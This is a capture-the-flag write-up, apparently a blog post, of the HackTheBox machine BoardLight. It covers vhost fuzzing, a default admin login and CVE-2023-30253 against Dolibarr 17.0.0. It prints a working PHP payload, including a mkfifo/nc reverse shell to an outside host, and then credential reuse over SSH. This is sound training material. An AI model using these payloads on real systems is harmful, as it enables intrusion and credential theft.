---
title: "BoardLight"
date: 2026-06-12 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, easy, vhost-fuzzing, dolibarr, cve-2023-30253, rce, credential-reuse, php-filter-bypass]
image:
    path: /assets/Images/BoardLight-avatar.png
    alt: BoardLight
description: "A Dolibarr CRM hidden behind a virtual host accepts default admin credentials and is vulnerable to CVE-2023-30253, where an uppercase <?PHP tag bypasses the PHP-tag filter for code execution; the web config leaks a database password that a local user has reused for SSH, yielding the user flag."
---
## Overview

BoardLight is an easy-difficulty Linux box. The web server hosts a corporate landing page on `board.htb`, but virtual-host fuzzing uncovers `crm.board.htb` running **Dolibarr 17.0.0**. The CRM accepts `admin:admin` and is vulnerable to **CVE-2023-30253**, an authenticated RCE that bypasses Dolibarr's PHP-tag filter using the uppercase `<?PHP` form. That foothold as `www-data` exposes a config file with a plaintext database password, which a local user has reused for SSH — handing over the user flag. This post covers recon through the user flag.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,62.0 233.7,122.8 201.7,221.2 137.1,167.8 150.0,150.0" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Enumeration plus CVE: vhost fuzzing finds Dolibarr, then CVE-2023-30253 PHP-tag-filter bypass gives RCE and reused DB-password credential leads to SSH, all realistic web misconfig.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH 8.2p1 | Ubuntu, default |
| 80/tcp | Apache httpd 2.4.41 | Ubuntu, no title |

```bash
nmap -p- --min-rate=1000 -T4 -Pn 10.10.11.11
nmap -p22,80 -Pn -sC -sV 10.10.11.11
```

Only SSH and HTTP are open. The site footer reveals the hostname `board.htb`, so add it to `/etc/hosts`:

```bash
echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts
```

## Enumeration

The landing page is a static "cybersecurity consulting" site with nothing obviously interactive. Fuzz for virtual hosts, filtering out the default response size:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
  -u http://board.htb/ -H 'Host: FUZZ.board.htb' -fs 15949
```

This surfaces a `crm` subdomain. Add it to `/etc/hosts`:

```bash
echo "10.10.11.11 crm.board.htb" | sudo tee -a /etc/hosts
```

`crm.board.htb` is a **Dolibarr 17.0.0** ERP/CRM login page (the version is printed at the top of the login form). Trying the classic default `admin:admin` logs straight in.

A quick search for Dolibarr 17.0.0 vulnerabilities leads to **CVE-2023-30253**: versions before 17.0.1 allow an authenticated user to achieve remote code execution. Dolibarr's website module strips the `<?php` tag from page content, but the filter is case-sensitive — PHP itself treats `<?PHP` as a valid opening tag, so the uppercase form sails through the blocklist and still executes.

## Foothold

In the Dolibarr UI, go to **Websites**, create a new site, add a page, then choose **Edit HTML Source**. First confirm code execution with a `whoami` probe:

```php
<?PHP echo system("whoami");?>
```

Viewing the page renders `www-data`. Swap the payload for a reverse shell, with a listener ready locally:

```bash
nc -lnvp 4455
```

```php
<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.41 4455 >/tmp/f");?>
```

Save and view the page to catch the shell as `www-data`, then stabilize it:

```bash
script /dev/null -c /bin/bash
```

Dolibarr keeps its database credentials in plaintext. Read the config:

```bash
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

```text
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='[redacted]';
```

`/etc/passwd` shows a real interactive user, `larissa`:

```bash
cat /etc/passwd | grep 'sh$'
# larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```

The database password has been reused for `larissa`'s account, so it works directly over SSH:

```bash
ssh larissa@board.htb
```

## User flag

```bash
cat /home/larissa/user.txt
# [redacted]
```

Shell as `larissa` and the user flag are ours.

Privilege escalation (an `enlightenment_sys` SUID binary vulnerable to CVE-2022-37706) is left as an exercise — this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/BoardLight-avatar.png" alt="BoardLight" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
